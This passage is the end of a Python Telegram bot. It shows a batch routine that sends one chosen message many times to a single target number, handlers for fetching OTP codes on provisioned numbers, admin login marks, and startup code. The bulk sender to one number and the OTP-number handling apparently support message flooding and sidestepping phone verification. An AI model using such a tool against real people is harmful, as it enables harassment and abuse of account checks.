                        f"<b>Sending Messages...</b> 🚀\n{bar} {i}/{quantity}\nSuccess: {success} | Failed: {failed}",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(kb)
                    )
                except Exception:
                    pass
            await asyncio.sleep(0.5)

        final_report = (
            f"✅ <b>Batch Send Finished</b> ✅\n\n"
            f"Target: <code>{html.escape(target_number)}</code>\n"
            f"Total Processed: {success + failed}/{quantity}\n"
            f"Successful: {success}\n"
            f"Failed: {failed}"
        )
        await status_msg.edit_text(final_report, parse_mode="HTML", reply_markup=get_main_menu())
        await notify_admin(context, f"Batch complete for <b>{html.escape(user.first_name)}</b>:\n{final_report}")
        await log_action_to_firebase(user.id, user.first_name, "BATCH_SEND_COMPLETED", f"Target: {target_number} | Success: {success} | Failed: {failed}")

    except asyncio.CancelledError:
        await status_msg.edit_text(
            f"🛑 <b>Batch Send Stopped Early</b>\n\nTarget: <code>{html.escape(target_number)}</code>\nSuccessful: {success}",
            parse_mode="HTML",
            reply_markup=get_main_menu()
        )
        await log_action_to_firebase(user.id, user.first_name, "BATCH_SEND_ABORTED", f"Target: {target_number} | Success: {success}")
    finally:
        active_send_tasks.pop(user.id, None)


# --- Callback Router ---
async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    if not is_authorized(user.id):
        return
    await query.answer()

    data = query.data
    if data == "get_otp":
        await handle_get_otp(update, context, is_new=False)
    elif data == "get_new_number":
        await handle_get_otp(update, context, is_new=True)
    elif data == "cancel_number":
        cancel_user_otp_task(user.id)
        try:
            await query.edit_message_text("🛑 OTP monitoring cancelled.", reply_markup=get_main_menu())
        except Exception:
            pass
        await log_action_to_firebase(user.id, user.first_name, "CANCELLED_OTP")
    elif data == "stop_sending":
        cancel_user_send_task(user.id)
    elif data.startswith("admin_login_") and is_admin(user.id):
        await handle_admin_mark(update, context, "login")
    elif data.startswith("admin_fail_") and is_admin(user.id):
        await handle_admin_mark(update, context, "fail")


# --- Application Startup & Shutdown Hooks ---
async def post_init(application: Application):
    await get_http_session()
    # Prime admin marks cache so first /login is instant
    asyncio.create_task(refresh_admin_marks_cache(force=True))
    asyncio.create_task(start_web_server())

async def post_shutdown(application: Application):
    global http_session
    if http_session and not http_session.closed:
        await http_session.close()


# --- Main App Execution ---
def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
        print("Error: BOT_TOKEN is missing.")
        return

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("block", cmd_block))
    app.add_handler(CommandHandler("release", cmd_release))
    app.add_handler(CommandHandler("cancelsend", cmd_cancelsend))
    app.add_handler(CommandHandler("login", cmd_login))

    # Send Message Conversation
    send_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_send_msg, pattern="^send_message$")],
        states={
            ASK_TARGET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_msg_text)],
            ASK_MESSAGE_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_quantity)],
            ASK_QUANTITY: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_sending)],
        },
        fallbacks=[
            CommandHandler('cancel', cancel_command),
            CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")
        ]
    )
    app.add_handler(send_conv)

    # Specific Number Conversation
    specific_no_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_specific_no, pattern="^get_specific_no$")],
        states={
            ASK_SPECIFIC_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_specific_number)],
        },
        fallbacks=[
            CommandHandler('cancel', cancel_command),
            CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")
        ]
    )
    app.add_handler(specific_no_conv)

    # Admin Send Conversation
    admin_send_conv = ConversationHandler(
        entry_points=[CommandHandler('send', cmd_admin_send)],
        states={
            ADMIN_WAIT_PAYLOAD: [MessageHandler(filters.ALL & ~filters.COMMAND, admin_forward_payload)],
        },
        fallbacks=[
            CommandHandler('cancel', cancel_command),
            CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")
        ]
    )
    app.add_handler(admin_send_conv)

    app.add_handler(CallbackQueryHandler(callback_router))

    print("Starting bot and web server...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
